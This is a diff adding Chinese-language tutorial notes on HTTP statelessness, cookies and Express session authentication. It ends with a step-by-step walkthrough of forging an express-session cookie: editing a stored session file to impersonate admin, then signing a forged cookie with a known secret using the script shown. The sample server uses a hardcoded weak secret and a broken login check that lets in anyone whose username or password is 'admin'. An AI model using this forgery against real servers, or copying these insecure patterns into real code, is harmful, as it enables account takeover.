@@ -5137,6 +5137,8 @@ db.query(sqlStr, 19, (err, result) => {
 
 服务端渲染的概念：服务器发送给客户端的HTML页面，是在服务器通过字符串的拼接，动态生成的。因此，客户端不需要使用AJAX这样的技术额外请求页面的数据。代码如下：
 
+**服务端渲染推荐使用Session认证机制**
+
 ![image-20231218215356286](JavaScript.assets/image-20231218215356286.png)
 
 ### 14.2 服务端渲染的优缺点
@@ -5150,3 +5152,272 @@ db.query(sqlStr, 19, (err, result) => {
 
 1. 占用服务端资源：即服务端完成HTML页面内容的拼接。如果请求较多，会对服务端造成一定的访问压力
 2. 不利于前后端分离，开发效率低：使用服务端渲染，则无法进行分工合作，尤其对前端复杂度高的项目，不利于项目高效开发
+
+**前后端分离推荐使用JST认证机制**
+
+## 15. 前后端身份认证
+
+### 15.1 HTTP 协议的无状态性
+
+HTTP协议的无状态性，指的是客户端的每次HTTP请求都是独立的，连续多个请求之间没有直接的关系，**服务器不会主动保留每次HTTP请求的状态**
+
+### 15.2 什么是Cookie
+
+Cookie是**存储在用户浏览器中的，一般不会超过4KB的字符串**。它是由一个名称（Name），一个值（Value）和其他介个用于控制Cookie有效期、安全性、使用方位的可选属性组成
+
+不同域名下的Cookie各自独立，每当客户端发起请求时，会**自动**把**当前域名**下所有**未过期的Cookie**一同发送到服务器。
+
+Cookie的几大特定：
+
+1. 自动发送
+2. 域名独立
+3. 过期限制
+4. 4KB限制
+
+### 15.3 Cookie在身份认证中的作用
+
+客户端在第一次请求服务器的时候，服务器**通过响应头的形式**，向客户端发送一个身份认证的Cookie，客户端会自动将Cookie保存在浏览器中
+
+随后，当客户端浏览器每次请求服务器的时候，浏览器会自动将身份认证相关的Cookie，****发送给服务器，服务器即可验明客户端的身份
+
+![image-20231218222640348](JavaScript.assets/image-20231218222640348.png)
+
+### 15.4 Cookie不具有安全性
+
+由于Cookie是存储在浏览器中，而且**浏览器也提供了读写Cookie的API**，因此**Cookie很容易伪造**，不具有安全性，因此不建议服务器将重要的隐私数据，通过Cookie的形式发送给浏览器
+
+### 15.5 Session提高安全性
+
+由于Cookie是存储在客户端的，那么客户端就可以通过伪造Cookie的形式来欺骗服务器
+
+换一种思路，如果服务器发送给客户端的Cookie是一串密文，（该密文的算法是对称密钥算法），客户端在拿着Cookie申请资源之前，服务器就会先使用对称密钥来对Cookie进行解密，来判断Cookie是否有被篡改。此时就可以有效解决Cookie伪造的问题
+
+精髓理念：（Cookie + Cookie认证）
+
+### 15.6 在Express中使用Session认证
+
+#### 15.6.1 express-session安装
+
+```
+D:\PHP\JavaScript\mysql>npm install express-session
+```
+
+#### 15.6.2 配置express-session中间件
+
+```
+let session = require('express-session')
+
+//1. 导入 session 中间件
+app.use(session({
+    secret: 'sugar',        // session 值
+    resave: false,          // 固定写法
+    saveUninitialized: false        // 固定写法
+}))
+```
+
+#### 15.6.3 向session中存数据
+
+当express-session中间件配置成功后，即可通过req.session来访问和使用session对象，从而存储用户的关键信息：
+
+```javascript
+app.post('/login', (req, res) => {
+    if (req.body.username !== 'admin' && req.body.password !== 'admin') {
+        return res.send({status: 0, msg: '不是管理员'})
+    }
+
+    // 登录成功：将数据存储到 session 中
+    req.session.user = req.body
+    req.session.isLogin = true
+    res.send({status: 1, msg: '登录成功'})
+})
+```
+
+#### 15.6.4 session 中取数据
+
+```javascript
+app.get('/username', (req, res) => {
+    if (!req.session.isLogin){
+        return res.send({status: 0, msg: '尚未登录'})
+    }
+
+    // req.session 本质上还是一个对象；req.session.user.username 即可取得用户名
+    res.send({status: 1, username: req.session.user.username})
+})
+```
+
+#### 15.6.5 清空session
+
+这里的`req.session.destroy()`只会清楚当前会话的session，并不会清除所有session
+
+```javascript
+app.get('/logout', (req, res) => {
+    // 清空当前会话的session
+    req.session.destroy()
+    res.send({status: 1, msg: '登出成功'})
+})
+```
+
+### 15.7 补充：Node.js session伪造
+
+#### 15.7.1 认识Node.js Cookie
+
+cookie 的生成，发生在 `express-session` 模块 的 `setcookie` 函数中
+
+```
+Cookie: connect.sid=s%3AcYxDFPBDKJMrSBqP0iYDVTV6z3mShXXz.h2MLE91sBsSk85youbctWxXxkZ%2F83MtHq4UzzElxi9s
+```
+
+Cookie 中关乎 session 的成分由两部分组成
+
+```
+s:sessionID.signature
+```
+
+#### 15.7.2 session 伪造
+
+**express-session 存储session 数据，默认是 内存存储，当使用session-file-store 模块辅助时可以 文件存储 。从而可以通过文件内容篡改、引导程序访问恶意 session 文件等方法，实现 session 伪造**
+
+**session 伪造前提条件：**
+
+1. 确认是用 `session-file-store`
+2. 确认业务下 session 的目录，默认是 `./sessions`
+3. 可以业务下 session 的目录
+4. 可以向业务下的 session 目录上传文件
+
+
+
+当配置session中间件的时候添加`store`属性，并指向`new FileStore()`就证明使用的是文件存储的形式存储session，如下：
+
+```javascript
+app.use(session({
+    store: new FileStore(),
+    secret: 'sugar',        // session 值
+    resave: false,          // 固定写法
+    saveUninitialized: false        // 固定写法
+}))
+```
+
+此时，如果服务器有session数据，就会在当前的目录下创建`session`文件夹并创建`sessionID.json`的session文件
+
+![image-20231218233442405](JavaScript.assets/image-20231218233442405.png)
+
+改文件内容如下：
+
+```
+{"cookie":{"originalMaxAge":null,"expires":null,"httpOnly":true,"path":"/"},"user":{"username":"admin","password":"admin"},"isLogin":true,"__lastAccess":1702913439228}
+```
+
+##### 15.7.2.1 seession 伪造过程
+
+**1. 前置要求**
+
+1. 确定服务端的`session`使用的是**文件存储**而非内存存储
+2. 确定服务端的`session`目录位置
+3. 可以向服务端的`session`目录上传和下载文件
+4. 知道`seesion`的密钥`secret`
+
+**2. 下载session文件**
+
+下载服务端的session文件，拿到session文件示例
+
+![image-20231218234452133](JavaScript.assets/image-20231218234452133.png)
+
+```
+{"cookie":{"originalMaxAge":null,"expires":null,"httpOnly":true,"path":"/"},"user":{"username":"bob","password":"admin"},"isLogin":true,"__lastAccess":1702914276488}
+```
+
+**3. 修改session文件**
+
+这里将用户名修改为`admin`，（假定这样可以假冒为管理员）
+
+```
+{"cookie":{"originalMaxAge":null,"expires":null,"httpOnly":true,"path":"/"},"user":{"username":"admin","password":"admin"},"isLogin":true,"__lastAccess":1702914276488}
+```
+
+每一个session都有一个时间戳 `"__lastAccess":1554299511812` 这个记得要改.
+
+**4. 上传session文件**
+
+![image-20231218234937094](JavaScript.assets/image-20231218234937094.png)
+
+**5. 伪造session**
+
+这个脚本建议在node_modules/express-session目录下建立, 不然就需要require一个很深的路径.
+
+```javascript
+var cookie = require('cookie');
+var crc = require('crc').crc32;
+var debug = require('debug')('express-session');
+var deprecate = require('depd')('express-session');
+var parseUrl = require('parseurl');
+var uid = require('uid-safe').sync
+    , onHeaders = require('on-headers')
+    , signature = require('cookie-signature')
+
+var val = "XcEx97vGpX0ORgSj8lGMiEg98lSOGDf_"; //修改后的sessionID (文件名)
+var secret = "sugar"; //签名session用的密钥
+var name = "name";
+var options = undefined;
+
+var signed = 's:' + signature.sign(val, secret);
+var data = cookie.serialize(name, signed, options);
+
+debug('set-cookie %s', data);
+
+console.log(data);
+```
+
+```
+D:\PHP\JavaScript\mysql\node_modules\express-session>node test.js
+name=s%3AXcEx97vGpX0ORgSj8lGMiEg98lSOGDf_.G7u%2BQMnuQeWYVRLESHI9%2Fz3vJ2NQXgKtBSZCB6v84Jg
+```
+
+将拿到的session重放到HTTP报文中，可以看到，username从`bob`成功改为了`admin`
+
+![image-20231218235715503](JavaScript.assets/image-20231218235715503.png)
+
+**6. 后台测试代码**
+
+```javascript
+const express = require('express')
+let session = require('express-session')
+let FileStore = require('session-file-store')(session)
+const app = express()
+
+//1. 导入 session 中间件
+app.use(session({
+    store: new FileStore(),
+    secret: 'sugar',        // session 值
+    resave: false,          // 固定写法
+    saveUninitialized: false        // 固定写法
+}))
+app.use(express.urlencoded({extended: false}))
+
+app.post('/login', (req, res) => {
+    if (req.body.username !== 'admin' && req.body.password !== 'admin') {
+        return res.send({status: 0, msg: '不是管理员'})
+    }
+
+    req.session.user = req.body
+    req.session.isLogin = true
+    res.send({status: 1, username: req.session.user.username})
+})
+
+app.get('/username', (req, res) => {
+    if (!req.session.isLogin){
+        return res.send({status: 0, msg: '尚未登录'})
+    }
+
+    res.send({status: 1, username: req.session.user.username})
+})
+
+app.get('/logout', (req, res) => {
+    req.session.destroy()
+    res.send({status: 1, msg: '登出成功'})
+})
+
+app.listen(80, () => {
+    console.log('http://127.0.0.1')
+})
+```
+
